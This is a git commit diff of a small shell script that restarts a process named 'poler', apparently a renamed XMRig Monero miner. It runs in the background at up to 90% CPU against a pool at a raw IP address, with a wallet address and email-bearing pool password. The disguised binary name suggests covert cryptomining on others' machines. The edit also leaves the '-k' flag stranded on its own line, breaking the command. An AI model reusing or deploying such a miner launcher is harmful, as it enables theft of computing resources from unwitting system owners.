91af61f74ed61f09095c83561b294aeb2f472732
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-06-16 23:30:18 +0300

    Update 40.sh

--- 40.sh
+++ 40.sh
@@ -1,3 +1,4 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 3 -o 94.103.94.11:5992 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=sasasa:ivanovandrey1984g@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 3 -o 94.103.94.11:5992 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=sasasa:faker85552@gmail.com
+ -k
